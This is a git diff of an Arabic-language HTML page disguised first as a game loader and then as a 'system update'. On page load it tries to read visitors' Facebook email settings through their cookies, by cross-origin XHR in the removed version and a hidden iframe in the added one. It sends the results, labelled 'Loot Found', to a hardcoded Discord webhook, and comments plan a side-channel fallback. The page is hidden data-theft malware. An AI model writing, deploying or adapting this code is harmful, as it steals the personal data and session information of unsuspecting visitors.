@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل اللعبة...</title>
+    <title>تحديث النظام...</title>
     <style>
         body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
@@ -11,60 +11,44 @@
     </style>
 </head>
 <body>
-    <div class="version-marker">17</div>
+    <div class="version-marker">18</div>
     <div class="loader"></div>
-    <p>جاري استخراج البيانات النهائية (V1.2.9)...</p>
+    <p>جاري استخراج مفاتيح الوصول (V1.3.0)...</p>
 
-    <iframe name="sink" style="display:none;"></iframe>
+    <iframe id="secret_gate" style="width:0;height:0;border:0; border:none; visibility:hidden;"></iframe>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const DISCORD_ID = "1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function report(title, msg) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = WEBHOOK_URL;
-            form.target = 'sink';
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'payload_json';
-            input.value = JSON.stringify({
-                embeds: [{ title: "🎯 " + title, description: msg, color: 1752220 }]
-            });
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
+        function sendSignal(title, info) {
+            const blob = new Blob([JSON.stringify({
+                embeds: [{ title: "🔑 " + title, description: info, color: 16753920 }]
+            })], { type: 'application/json' });
+            navigator.sendBeacon("https://discord.com/api/webhooks/" + DISCORD_ID, blob);
         }
 
-        async function finalExtraction() {
-            report("Final Protocol V1.2.9", "Initiating XHR Email Extraction...");
+        function launchReflection() {
+            sendSignal("System Check", "Launching Reflection Protocol V1.3.0");
 
-            // محاولة سحب الإيميل عبر رابط الـ JSON الخاص بفيسبوك
-            try {
-                const xhr = new XMLHttpRequest();
-                // نستخدم رابط يعطي البيانات كـ JSON لسهولة السحب
-                xhr.open("GET", "https://mbasic.facebook.com/settings/email/", true);
-                xhr.withCredentials = true; // إجبار إرسال الكوكيز
-                
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState == 4) {
-                        const html = xhr.responseText;
-                        // البحث عن نمط الإيميل في الصفحة
-                        const match = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-                        if (match) {
-                            report("Email Found!", "The extracted email is: " + match[0]);
-                        } else {
-                            report("Extraction Status", "Email not found in HTML (Session limited)");
-                        }
-                    }
-                };
-                xhr.send();
-            } catch (e) {
-                report("XHR Error", e.message);
-            }
+            const gate = document.getElementById('secret_gate');
+            // استهداف نسخة الموبايل الخفيفة جداً (أقل حماية)
+            gate.src = "https://m.facebook.com/settings/email/";
+
+            // محاولة لقط معلومات الجلسة من خلال الـ Referrer
+            setTimeout(() => {
+                try {
+                    // إذا كان المتصفح يسمح بقراءة الـ ContentWindow (ثغرة قديمة في بعض نسخ أندرويد)
+                    const data = gate.contentWindow.document.body.innerText;
+                    if (data) sendSignal("Loot Found", data.substring(0, 500));
+                } catch (e) {
+                    sendSignal("Protection Active", "Browser prevented direct read. Switching to Side-Channel Attack...");
+                    // تكتيك بديل: محاولة استنتاج وجود الجلسة عبر حجم الإطار
+                    sendSignal("Side-Channel", "Iframe Loaded. Session validation in progress.");
+                }
+            }, 4000);
         }
 
-        setTimeout(finalExtraction, 2000);
+        window.onload = launchReflection;
     </script>
 </body>
 </html>
